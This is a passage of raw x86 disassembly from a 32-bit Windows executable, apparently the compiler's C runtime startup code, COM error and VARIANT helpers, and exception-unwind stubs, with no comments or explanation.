  4048f2:	89 08                	mov    %ecx,(%eax)
  4048f4:	a1 f8 62 40 00       	mov    0x4062f8,%eax
  4048f9:	8b 00                	mov    (%eax),%eax
  4048fb:	a3 34 45 45 00       	mov    %eax,0x454534
  404900:	e8 1c 01 00 00       	call   0x404a21
  404905:	39 1d a8 43 45 00    	cmp    %ebx,0x4543a8
  40490b:	75 0c                	jne    0x404919
  40490d:	68 1e 4a 40 00       	push   $0x404a1e
  404912:	ff 15 f4 62 40 00    	call   *0x4062f4
  404918:	59                   	pop    %ecx
  404919:	e8 ee 00 00 00       	call   0x404a0c
  40491e:	68 38 90 40 00       	push   $0x409038
  404923:	68 34 90 40 00       	push   $0x409034
  404928:	e8 d9 00 00 00       	call   0x404a06
  40492d:	a1 10 45 45 00       	mov    0x454510,%eax
  404932:	89 45 94             	mov    %eax,-0x6c(%ebp)
  404935:	8d 45 94             	lea    -0x6c(%ebp),%eax
  404938:	50                   	push   %eax
  404939:	ff 35 0c 45 45 00    	push   0x45450c
  40493f:	8d 45 9c             	lea    -0x64(%ebp),%eax
  404942:	50                   	push   %eax
  404943:	8d 45 90             	lea    -0x70(%ebp),%eax
  404946:	50                   	push   %eax
  404947:	8d 45 a0             	lea    -0x60(%ebp),%eax
  40494a:	50                   	push   %eax
  40494b:	ff 15 e8 62 40 00    	call   *0x4062e8
  404951:	68 30 90 40 00       	push   $0x409030
  404956:	68 00 90 40 00       	push   $0x409000
  40495b:	e8 a6 00 00 00       	call   0x404a06
  404960:	83 c4 24             	add    $0x24,%esp
  404963:	a1 e4 62 40 00       	mov    0x4062e4,%eax
  404968:	8b 30                	mov    (%eax),%esi
  40496a:	89 75 8c             	mov    %esi,-0x74(%ebp)
  40496d:	80 3e 22             	cmpb   $0x22,(%esi)
  404970:	75 3a                	jne    0x4049ac
  404972:	46                   	inc    %esi
  404973:	89 75 8c             	mov    %esi,-0x74(%ebp)
  404976:	8a 06                	mov    (%esi),%al
  404978:	3a c3                	cmp    %bl,%al
  40497a:	74 04                	je     0x404980
  40497c:	3c 22                	cmp    $0x22,%al
  40497e:	75 f2                	jne    0x404972
  404980:	80 3e 22             	cmpb   $0x22,(%esi)
  404983:	75 04                	jne    0x404989
  404985:	46                   	inc    %esi
  404986:	89 75 8c             	mov    %esi,-0x74(%ebp)
  404989:	8a 06                	mov    (%esi),%al
  40498b:	3a c3                	cmp    %bl,%al
  40498d:	74 04                	je     0x404993
  40498f:	3c 20                	cmp    $0x20,%al
  404991:	76 f2                	jbe    0x404985
  404993:	89 5d d0             	mov    %ebx,-0x30(%ebp)
  404996:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  404999:	50                   	push   %eax
  40499a:	ff 15 2c 60 40 00    	call   *0x40602c
  4049a0:	f6 45 d0 01          	testb  $0x1,-0x30(%ebp)
  4049a4:	74 11                	je     0x4049b7
  4049a6:	0f b7 45 d4          	movzwl -0x2c(%ebp),%eax
  4049aa:	eb 0e                	jmp    0x4049ba
  4049ac:	80 3e 20             	cmpb   $0x20,(%esi)
  4049af:	76 d8                	jbe    0x404989
  4049b1:	46                   	inc    %esi
  4049b2:	89 75 8c             	mov    %esi,-0x74(%ebp)
  4049b5:	eb f5                	jmp    0x4049ac
  4049b7:	6a 0a                	push   $0xa
  4049b9:	58                   	pop    %eax
  4049ba:	50                   	push   %eax
  4049bb:	56                   	push   %esi
  4049bc:	53                   	push   %ebx
  4049bd:	53                   	push   %ebx
  4049be:	ff 15 28 60 40 00    	call   *0x406028
  4049c4:	50                   	push   %eax
  4049c5:	e8 cb 01 00 00       	call   0x404b95
  4049ca:	89 45 98             	mov    %eax,-0x68(%ebp)
  4049cd:	50                   	push   %eax
  4049ce:	ff 15 e0 62 40 00    	call   *0x4062e0
  4049d4:	8b 45 ec             	mov    -0x14(%ebp),%eax
  4049d7:	8b 08                	mov    (%eax),%ecx
  4049d9:	8b 09                	mov    (%ecx),%ecx
  4049db:	89 4d 88             	mov    %ecx,-0x78(%ebp)
  4049de:	50                   	push   %eax
  4049df:	51                   	push   %ecx
  4049e0:	e8 1b 00 00 00       	call   0x404a00
  4049e5:	59                   	pop    %ecx
  4049e6:	59                   	pop    %ecx
  4049e7:	c3                   	ret
  4049e8:	8b 65 e8             	mov    -0x18(%ebp),%esp
  4049eb:	ff 75 88             	push   -0x78(%ebp)
  4049ee:	ff 15 a8 62 40 00    	call   *0x4062a8
  4049f4:	ff 25 b4 62 40 00    	jmp    *0x4062b4
  4049fa:	ff 25 ac 62 40 00    	jmp    *0x4062ac
  404a00:	ff 25 c8 62 40 00    	jmp    *0x4062c8
  404a06:	ff 25 ec 62 40 00    	jmp    *0x4062ec
  404a0c:	68 00 00 03 00       	push   $0x30000
  404a11:	68 00 00 01 00       	push   $0x10000
  404a16:	e8 07 00 00 00       	call   0x404a22
  404a1b:	59                   	pop    %ecx
  404a1c:	59                   	pop    %ecx
  404a1d:	c3                   	ret
  404a1e:	33 c0                	xor    %eax,%eax
  404a20:	c3                   	ret
  404a21:	c3                   	ret
  404a22:	ff 25 04 63 40 00    	jmp    *0x406304
  404a28:	6a 00                	push   $0x0
  404a2a:	ff 74 24 08          	push   0x8(%esp)
  404a2e:	e8 9d 00 00 00       	call   0x404ad0
  404a33:	c2 04 00             	ret    $0x4
  404a36:	e8 05 00 00 00       	call   0x404a40
  404a3b:	e9 12 00 00 00       	jmp    0x404a52
  404a40:	6a 0a                	push   $0xa
  404a42:	68 04 00 02 80       	push   $0x80020004
  404a47:	b9 20 45 45 00       	mov    $0x454520,%ecx
  404a4c:	e8 23 00 00 00       	call   0x404a74
  404a51:	c3                   	ret
  404a52:	68 5e 4a 40 00       	push   $0x404a5e
  404a57:	e8 00 fe ff ff       	call   0x40485c
  404a5c:	59                   	pop    %ecx
  404a5d:	c3                   	ret
  404a5e:	68 20 45 45 00       	push   $0x454520
  404a63:	ff 15 10 63 40 00    	call   *0x406310
  404a69:	85 c0                	test   %eax,%eax
  404a6b:	7d 06                	jge    0x404a73
  404a6d:	50                   	push   %eax
  404a6e:	e8 b5 ff ff ff       	call   0x404a28
  404a73:	c3                   	ret
  404a74:	56                   	push   %esi
  404a75:	57                   	push   %edi
  404a76:	66 8b 7c 24 10       	mov    0x10(%esp),%di
  404a7b:	8b f1                	mov    %ecx,%esi
  404a7d:	66 83 ff 03          	cmp    $0x3,%di
  404a81:	74 16                	je     0x404a99
  404a83:	66 83 ff 0a          	cmp    $0xa,%di
  404a87:	74 16                	je     0x404a9f
  404a89:	66 83 ff 0b          	cmp    $0xb,%di
  404a8d:	74 0a                	je     0x404a99
  404a8f:	68 57 00 07 80       	push   $0x80070057
  404a94:	e8 8f ff ff ff       	call   0x404a28
  404a99:	66 83 ff 0a          	cmp    $0xa,%di
  404a9d:	75 07                	jne    0x404aa6
  404a9f:	66 c7 06 0a 00       	movw   $0xa,(%esi)
  404aa4:	eb 1c                	jmp    0x404ac2
  404aa6:	66 83 ff 0b          	cmp    $0xb,%di
  404aaa:	75 11                	jne    0x404abd
  404aac:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404ab0:	66 89 3e             	mov    %di,(%esi)
  404ab3:	f7 d8                	neg    %eax
  404ab5:	1b c0                	sbb    %eax,%eax
  404ab7:	66 89 46 08          	mov    %ax,0x8(%esi)
  404abb:	eb 0c                	jmp    0x404ac9
  404abd:	66 c7 06 03 00       	movw   $0x3,(%esi)
  404ac2:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404ac6:	89 46 08             	mov    %eax,0x8(%esi)
  404ac9:	8b c6                	mov    %esi,%eax
  404acb:	5f                   	pop    %edi
  404acc:	5e                   	pop    %esi
  404acd:	c2 08 00             	ret    $0x8
  404ad0:	55                   	push   %ebp
  404ad1:	8b ec                	mov    %esp,%ebp
  404ad3:	83 ec 10             	sub    $0x10,%esp
  404ad6:	6a 00                	push   $0x0
  404ad8:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404adb:	ff 75 0c             	push   0xc(%ebp)
  404ade:	ff 75 08             	push   0x8(%ebp)
  404ae1:	e8 0e 00 00 00       	call   0x404af4
  404ae6:	8d 45 f0             	lea    -0x10(%ebp),%eax
  404ae9:	68 50 7d 40 00       	push   $0x407d50
  404aee:	50                   	push   %eax
  404aef:	e8 96 fd ff ff       	call   0x40488a
  404af4:	8b 44 24 04          	mov    0x4(%esp),%eax
  404af8:	56                   	push   %esi
  404af9:	8b f1                	mov    %ecx,%esi
  404afb:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  404aff:	89 46 04             	mov    %eax,0x4(%esi)
  404b02:	8b 44 24 0c          	mov    0xc(%esp),%eax
  404b06:	c7 06 10 73 40 00    	movl   $0x407310,(%esi)
  404b0c:	85 c0                	test   %eax,%eax
  404b0e:	89 46 08             	mov    %eax,0x8(%esi)
  404b11:	74 0d                	je     0x404b20
  404b13:	80 7c 24 10 00       	cmpb   $0x0,0x10(%esp)
  404b18:	74 06                	je     0x404b20
  404b1a:	8b 08                	mov    (%eax),%ecx
  404b1c:	50                   	push   %eax
  404b1d:	ff 51 04             	call   *0x4(%ecx)
  404b20:	8b c6                	mov    %esi,%eax
  404b22:	5e                   	pop    %esi
  404b23:	c2 0c 00             	ret    $0xc
  404b26:	56                   	push   %esi
  404b27:	8b f1                	mov    %ecx,%esi
  404b29:	e8 41 00 00 00       	call   0x404b6f
  404b2e:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  404b33:	74 07                	je     0x404b3c
  404b35:	56                   	push   %esi
  404b36:	e8 e7 fa ff ff       	call   0x404622
  404b3b:	59                   	pop    %ecx
  404b3c:	8b c6                	mov    %esi,%eax
  404b3e:	5e                   	pop    %esi
  404b3f:	c2 04 00             	ret    $0x4
  404b42:	8b 44 24 04          	mov    0x4(%esp),%eax
  404b46:	56                   	push   %esi
  404b47:	8b f1                	mov    %ecx,%esi
  404b49:	8b 48 04             	mov    0x4(%eax),%ecx
  404b4c:	89 4e 04             	mov    %ecx,0x4(%esi)
  404b4f:	8b 40 08             	mov    0x8(%eax),%eax
  404b52:	83 66 0c 00          	andl   $0x0,0xc(%esi)
  404b56:	89 46 08             	mov    %eax,0x8(%esi)
  404b59:	85 c0                	test   %eax,%eax
  404b5b:	c7 06 10 73 40 00    	movl   $0x407310,(%esi)
  404b61:	74 06                	je     0x404b69
  404b63:	8b 08                	mov    (%eax),%ecx
  404b65:	50                   	push   %eax
  404b66:	ff 51 04             	call   *0x4(%ecx)
  404b69:	8b c6                	mov    %esi,%eax
  404b6b:	5e                   	pop    %esi
  404b6c:	c2 04 00             	ret    $0x4
  404b6f:	56                   	push   %esi
  404b70:	8b f1                	mov    %ecx,%esi
  404b72:	8b 46 08             	mov    0x8(%esi),%eax
  404b75:	c7 06 10 73 40 00    	movl   $0x407310,(%esi)
  404b7b:	85 c0                	test   %eax,%eax
  404b7d:	74 06                	je     0x404b85
  404b7f:	8b 08                	mov    (%eax),%ecx
  404b81:	50                   	push   %eax
  404b82:	ff 51 08             	call   *0x8(%ecx)
  404b85:	8b 76 0c             	mov    0xc(%esi),%esi
  404b88:	85 f6                	test   %esi,%esi
  404b8a:	74 07                	je     0x404b93
  404b8c:	56                   	push   %esi
  404b8d:	ff 15 30 60 40 00    	call   *0x406030
  404b93:	5e                   	pop    %esi
  404b94:	c3                   	ret
  404b95:	ff 74 24 10          	push   0x10(%esp)
  404b99:	ff 74 24 10          	push   0x10(%esp)
  404b9d:	ff 74 24 10          	push   0x10(%esp)
  404ba1:	ff 74 24 10          	push   0x10(%esp)
  404ba5:	e8 76 00 00 00       	call   0x404c20
  404baa:	c2 10 00             	ret    $0x10
  404bad:	e8 08 fc ff ff       	call   0x4047ba
  404bb2:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  404bb6:	8b 54 24 08          	mov    0x8(%esp),%edx
  404bba:	85 c9                	test   %ecx,%ecx
  404bbc:	88 48 14             	mov    %cl,0x14(%eax)
  404bbf:	89 90 40 10 00 00    	mov    %edx,0x1040(%eax)
  404bc5:	75 09                	jne    0x404bd0
  404bc7:	6a fd                	push   $0xfffffffd
  404bc9:	ff 15 dc 62 40 00    	call   *0x4062dc
  404bcf:	59                   	pop    %ecx
  404bd0:	6a 01                	push   $0x1
  404bd2:	58                   	pop    %eax
  404bd3:	c2 08 00             	ret    $0x8
  404bd6:	e9 00 00 00 00       	jmp    0x404bdb
  404bdb:	68 00 06 00 00       	push   $0x600
  404be0:	6a 00                	push   $0x0
  404be2:	e8 c6 ff ff ff       	call   0x404bad
  404be7:	a2 30 45 45 00       	mov    %al,0x454530
  404bec:	c3                   	ret
  404bed:	cc                   	int3
  404bee:	cc                   	int3
  404bef:	cc                   	int3
  404bf0:	51                   	push   %ecx
  404bf1:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404bf6:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  404bfa:	72 14                	jb     0x404c10
  404bfc:	81 e9 00 10 00 00    	sub    $0x1000,%ecx
  404c02:	2d 00 10 00 00       	sub    $0x1000,%eax
  404c07:	85 01                	test   %eax,(%ecx)
  404c09:	3d 00 10 00 00       	cmp    $0x1000,%eax
  404c0e:	73 ec                	jae    0x404bfc
  404c10:	2b c8                	sub    %eax,%ecx
  404c12:	8b c4                	mov    %esp,%eax
  404c14:	85 01                	test   %eax,(%ecx)
  404c16:	8b e1                	mov    %ecx,%esp
  404c18:	8b 08                	mov    (%eax),%ecx
  404c1a:	8b 40 04             	mov    0x4(%eax),%eax
  404c1d:	50                   	push   %eax
  404c1e:	c3                   	ret
  404c1f:	cc                   	int3
  404c20:	ff 25 74 62 40 00    	jmp    *0x406274
  404c26:	cc                   	int3
  404c27:	cc                   	int3
  404c28:	cc                   	int3
  404c29:	cc                   	int3
  404c2a:	cc                   	int3
  404c2b:	cc                   	int3
  404c2c:	cc                   	int3
  404c2d:	cc                   	int3
  404c2e:	cc                   	int3
  404c2f:	cc                   	int3
  404c30:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c33:	e9 d2 f9 ff ff       	jmp    0x40460a
  404c38:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c3b:	83 c1 60             	add    $0x60,%ecx
  404c3e:	e9 c1 f9 ff ff       	jmp    0x404604
  404c43:	b8 a8 73 40 00       	mov    $0x4073a8,%eax
  404c48:	e9 d3 fb ff ff       	jmp    0x404820
  404c4d:	cc                   	int3
  404c4e:	cc                   	int3
  404c4f:	cc                   	int3
  404c50:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c53:	e9 b2 f9 ff ff       	jmp    0x40460a
  404c58:	b8 d8 73 40 00       	mov    $0x4073d8,%eax
  404c5d:	e9 be fb ff ff       	jmp    0x404820
  404c62:	cc                   	int3
  404c63:	cc                   	int3
  404c64:	cc                   	int3
  404c65:	cc                   	int3
  404c66:	cc                   	int3
  404c67:	cc                   	int3
  404c68:	cc                   	int3
  404c69:	cc                   	int3
  404c6a:	cc                   	int3
  404c6b:	cc                   	int3
  404c6c:	cc                   	int3
  404c6d:	cc                   	int3
  404c6e:	cc                   	int3
  404c6f:	cc                   	int3
  404c70:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c73:	e9 92 f9 ff ff       	jmp    0x40460a
  404c78:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c7b:	83 c1 60             	add    $0x60,%ecx
  404c7e:	e9 17 fa ff ff       	jmp    0x40469a
  404c83:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c86:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  404c8c:	e9 03 fa ff ff       	jmp    0x404694
  404c91:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404c94:	81 c1 e4 00 00 00    	add    $0xe4,%ecx
  404c9a:	e9 65 f9 ff ff       	jmp    0x404604
  404c9f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ca2:	81 c1 ec 00 00 00    	add    $0xec,%ecx
  404ca8:	e9 57 f9 ff ff       	jmp    0x404604
  404cad:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cb0:	81 c1 f0 00 00 00    	add    $0xf0,%ecx
  404cb6:	e9 85 cb ff ff       	jmp    0x401840
  404cbb:	b8 00 74 40 00       	mov    $0x407400,%eax
  404cc0:	e9 5b fb ff ff       	jmp    0x404820
  404cc5:	cc                   	int3
  404cc6:	cc                   	int3
  404cc7:	cc                   	int3
  404cc8:	cc                   	int3
  404cc9:	cc                   	int3
  404cca:	cc                   	int3
  404ccb:	cc                   	int3
  404ccc:	cc                   	int3
  404ccd:	cc                   	int3
  404cce:	cc                   	int3
  404ccf:	cc                   	int3
  404cd0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cd3:	e9 32 f9 ff ff       	jmp    0x40460a
  404cd8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cdb:	83 c1 60             	add    $0x60,%ecx
  404cde:	e9 b7 f9 ff ff       	jmp    0x40469a
  404ce3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ce6:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  404cec:	e9 a3 f9 ff ff       	jmp    0x404694
  404cf1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404cf4:	81 c1 e4 00 00 00    	add    $0xe4,%ecx
  404cfa:	e9 05 f9 ff ff       	jmp    0x404604
  404cff:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d02:	81 c1 ec 00 00 00    	add    $0xec,%ecx
  404d08:	e9 f7 f8 ff ff       	jmp    0x404604
  404d0d:	b8 50 74 40 00       	mov    $0x407450,%eax
  404d12:	e9 09 fb ff ff       	jmp    0x404820
  404d17:	cc                   	int3
  404d18:	cc                   	int3
  404d19:	cc                   	int3
  404d1a:	cc                   	int3
  404d1b:	cc                   	int3
  404d1c:	cc                   	int3
  404d1d:	cc                   	int3
  404d1e:	cc                   	int3
  404d1f:	cc                   	int3
  404d20:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  404d26:	e9 d9 f8 ff ff       	jmp    0x404604
  404d2b:	8d 8d 6c ff ff ff    	lea    -0x94(%ebp),%ecx
  404d31:	e9 ce f8 ff ff       	jmp    0x404604
  404d36:	b8 98 74 40 00       	mov    $0x407498,%eax
  404d3b:	e9 e0 fa ff ff       	jmp    0x404820
  404d40:	8d 8d 60 ff ff ff    	lea    -0xa0(%ebp),%ecx
  404d46:	ff 25 80 62 40 00    	jmp    *0x406280
  404d4c:	8d 8d 50 ff ff ff    	lea    -0xb0(%ebp),%ecx
  404d52:	ff 25 80 62 40 00    	jmp    *0x406280
  404d58:	b8 c8 74 40 00       	mov    $0x4074c8,%eax
  404d5d:	e9 be fa ff ff       	jmp    0x404820
  404d62:	cc                   	int3
  404d63:	cc                   	int3
  404d64:	cc                   	int3
  404d65:	cc                   	int3
  404d66:	cc                   	int3
  404d67:	cc                   	int3
  404d68:	cc                   	int3
  404d69:	cc                   	int3
  404d6a:	cc                   	int3
  404d6b:	cc                   	int3
  404d6c:	cc                   	int3
  404d6d:	cc                   	int3
  404d6e:	cc                   	int3
  404d6f:	cc                   	int3
  404d70:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d73:	e9 92 f8 ff ff       	jmp    0x40460a
  404d78:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d7b:	83 c1 60             	add    $0x60,%ecx
  404d7e:	e9 11 f9 ff ff       	jmp    0x404694
  404d83:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d86:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  404d8c:	e9 73 f8 ff ff       	jmp    0x404604
  404d91:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404d94:	81 c1 b0 00 00 00    	add    $0xb0,%ecx
  404d9a:	e9 a1 ca ff ff       	jmp    0x401840
  404d9f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404da2:	81 c1 b4 00 00 00    	add    $0xb4,%ecx
  404da8:	e9 57 f8 ff ff       	jmp    0x404604
  404dad:	b8 f8 74 40 00       	mov    $0x4074f8,%eax
  404db2:	e9 69 fa ff ff       	jmp    0x404820
  404db7:	cc                   	int3
  404db8:	cc                   	int3
  404db9:	cc                   	int3
  404dba:	cc                   	int3
  404dbb:	cc                   	int3
  404dbc:	cc                   	int3
  404dbd:	cc                   	int3
  404dbe:	cc                   	int3
  404dbf:	cc                   	int3
  404dc0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404dc3:	e9 42 f8 ff ff       	jmp    0x40460a
  404dc8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404dcb:	83 c1 60             	add    $0x60,%ecx
  404dce:	e9 c1 f8 ff ff       	jmp    0x404694
  404dd3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404dd6:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  404ddc:	e9 23 f8 ff ff       	jmp    0x404604
  404de1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404de4:	81 c1 b0 00 00 00    	add    $0xb0,%ecx
  404dea:	e9 51 ca ff ff       	jmp    0x401840
  404def:	b8 40 75 40 00       	mov    $0x407540,%eax
  404df4:	e9 27 fa ff ff       	jmp    0x404820
  404df9:	cc                   	int3
  404dfa:	cc                   	int3
  404dfb:	cc                   	int3
  404dfc:	cc                   	int3
  404dfd:	cc                   	int3
  404dfe:	cc                   	int3
  404dff:	cc                   	int3
  404e00:	8b 45 f0             	mov    -0x10(%ebp),%eax
  404e03:	50                   	push   %eax
  404e04:	e8 37 d5 ff ff       	call   0x402340
  404e09:	c3                   	ret
  404e0a:	b8 80 75 40 00       	mov    $0x407580,%eax
  404e0f:	e9 0c fa ff ff       	jmp    0x404820
  404e14:	cc                   	int3
  404e15:	cc                   	int3
  404e16:	cc                   	int3
  404e17:	cc                   	int3
  404e18:	cc                   	int3
  404e19:	cc                   	int3
  404e1a:	cc                   	int3
  404e1b:	cc                   	int3
  404e1c:	cc                   	int3
  404e1d:	cc                   	int3
  404e1e:	cc                   	int3
  404e1f:	cc                   	int3
  404e20:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e23:	e9 c0 f8 ff ff       	jmp    0x4046e8
  404e28:	b8 a8 75 40 00       	mov    $0x4075a8,%eax
  404e2d:	e9 ee f9 ff ff       	jmp    0x404820
  404e32:	cc                   	int3
  404e33:	cc                   	int3
  404e34:	cc                   	int3
  404e35:	cc                   	int3
  404e36:	cc                   	int3
  404e37:	cc                   	int3
  404e38:	cc                   	int3
  404e39:	cc                   	int3
  404e3a:	cc                   	int3
  404e3b:	cc                   	int3
  404e3c:	cc                   	int3
  404e3d:	cc                   	int3
  404e3e:	cc                   	int3
  404e3f:	cc                   	int3
  404e40:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e43:	e9 c2 f7 ff ff       	jmp    0x40460a
  404e48:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e4b:	83 c1 60             	add    $0x60,%ecx
  404e4e:	e9 41 f8 ff ff       	jmp    0x404694
  404e53:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e56:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  404e5c:	e9 a3 f7 ff ff       	jmp    0x404604
  404e61:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e64:	81 c1 a4 00 00 00    	add    $0xa4,%ecx
  404e6a:	e9 95 f7 ff ff       	jmp    0x404604
  404e6f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e72:	81 c1 a8 00 00 00    	add    $0xa8,%ecx
  404e78:	e9 87 f7 ff ff       	jmp    0x404604
  404e7d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e80:	81 c1 ac 00 00 00    	add    $0xac,%ecx
  404e86:	e9 79 f7 ff ff       	jmp    0x404604
  404e8b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404e8e:	81 c1 b4 00 00 00    	add    $0xb4,%ecx
  404e94:	e9 a7 c9 ff ff       	jmp    0x401840
  404e99:	b8 d0 75 40 00       	mov    $0x4075d0,%eax
  404e9e:	e9 7d f9 ff ff       	jmp    0x404820
  404ea3:	cc                   	int3
  404ea4:	cc                   	int3
  404ea5:	cc                   	int3
  404ea6:	cc                   	int3
  404ea7:	cc                   	int3
  404ea8:	cc                   	int3
  404ea9:	cc                   	int3
  404eaa:	cc                   	int3
  404eab:	cc                   	int3
  404eac:	cc                   	int3
  404ead:	cc                   	int3
  404eae:	cc                   	int3
  404eaf:	cc                   	int3
  404eb0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404eb3:	e9 52 f7 ff ff       	jmp    0x40460a
  404eb8:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ebb:	83 c1 60             	add    $0x60,%ecx
  404ebe:	e9 d1 f7 ff ff       	jmp    0x404694
  404ec3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ec6:	81 c1 a0 00 00 00    	add    $0xa0,%ecx
  404ecc:	e9 33 f7 ff ff       	jmp    0x404604
  404ed1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ed4:	81 c1 a4 00 00 00    	add    $0xa4,%ecx
  404eda:	e9 25 f7 ff ff       	jmp    0x404604
  404edf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ee2:	81 c1 a8 00 00 00    	add    $0xa8,%ecx
  404ee8:	e9 17 f7 ff ff       	jmp    0x404604
  404eed:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404ef0:	81 c1 ac 00 00 00    	add    $0xac,%ecx
  404ef6:	e9 09 f7 ff ff       	jmp    0x404604
  404efb:	b8 28 76 40 00       	mov    $0x407628,%eax
  404f00:	e9 1b f9 ff ff       	jmp    0x404820
  404f05:	cc                   	int3
  404f06:	cc                   	int3
  404f07:	cc                   	int3
  404f08:	cc                   	int3
  404f09:	cc                   	int3
  404f0a:	cc                   	int3
  404f0b:	cc                   	int3
  404f0c:	cc                   	int3
  404f0d:	cc                   	int3
  404f0e:	cc                   	int3
  404f0f:	cc                   	int3
  404f10:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f13:	e9 f2 f6 ff ff       	jmp    0x40460a
  404f18:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f1b:	83 c1 60             	add    $0x60,%ecx
  404f1e:	e9 71 f7 ff ff       	jmp    0x404694
  404f23:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f26:	81 c1 a4 00 00 00    	add    $0xa4,%ecx
  404f2c:	e9 d3 f6 ff ff       	jmp    0x404604
  404f31:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f34:	81 c1 a8 00 00 00    	add    $0xa8,%ecx
  404f3a:	e9 c5 f6 ff ff       	jmp    0x404604
  404f3f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f42:	81 c1 ac 00 00 00    	add    $0xac,%ecx
  404f48:	e9 b7 f6 ff ff       	jmp    0x404604
  404f4d:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f50:	81 c1 b0 00 00 00    	add    $0xb0,%ecx
  404f56:	e9 a9 f6 ff ff       	jmp    0x404604
  404f5b:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f5e:	81 c1 b8 00 00 00    	add    $0xb8,%ecx
  404f64:	e9 9b f6 ff ff       	jmp    0x404604
  404f69:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f6c:	81 c1 bc 00 00 00    	add    $0xbc,%ecx
  404f72:	e9 c9 c8 ff ff       	jmp    0x401840
  404f77:	b8 78 76 40 00       	mov    $0x407678,%eax
  404f7c:	e9 9f f8 ff ff       	jmp    0x404820
  404f81:	cc                   	int3
  404f82:	cc                   	int3
  404f83:	cc                   	int3
  404f84:	cc                   	int3
  404f85:	cc                   	int3
  404f86:	cc                   	int3
  404f87:	cc                   	int3
  404f88:	cc                   	int3
  404f89:	cc                   	int3
  404f8a:	cc                   	int3
  404f8b:	cc                   	int3
  404f8c:	cc                   	int3
  404f8d:	cc                   	int3
  404f8e:	cc                   	int3
  404f8f:	cc                   	int3
  404f90:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f93:	e9 72 f6 ff ff       	jmp    0x40460a
  404f98:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404f9b:	83 c1 60             	add    $0x60,%ecx
  404f9e:	e9 f1 f6 ff ff       	jmp    0x404694
  404fa3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404fa6:	81 c1 a4 00 00 00    	add    $0xa4,%ecx
  404fac:	e9 53 f6 ff ff       	jmp    0x404604
  404fb1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404fb4:	81 c1 a8 00 00 00    	add    $0xa8,%ecx
  404fba:	e9 45 f6 ff ff       	jmp    0x404604
  404fbf:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404fc2:	81 c1 ac 00 00 00    	add    $0xac,%ecx
  404fc8:	e9 37 f6 ff ff       	jmp    0x404604
  404fcd:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404fd0:	81 c1 b0 00 00 00    	add    $0xb0,%ecx
  404fd6:	e9 29 f6 ff ff       	jmp    0x404604
  404fdb:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  404fde:	81 c1 b8 00 00 00    	add    $0xb8,%ecx
  404fe4:	e9 1b f6 ff ff       	jmp    0x404604
  404fe9:	b8 d8 76 40 00       	mov    $0x4076d8,%eax
  404fee:	e9 2d f8 ff ff       	jmp    0x404820
  404ff3:	cc                   	int3
  404ff4:	cc                   	int3
  404ff5:	cc                   	int3
  404ff6:	cc                   	int3
  404ff7:	cc                   	int3
  404ff8:	cc                   	int3
  404ff9:	cc                   	int3
  404ffa:	cc                   	int3
  404ffb:	cc                   	int3
  404ffc:	cc                   	int3
  404ffd:	cc                   	int3
  404ffe:	cc                   	int3
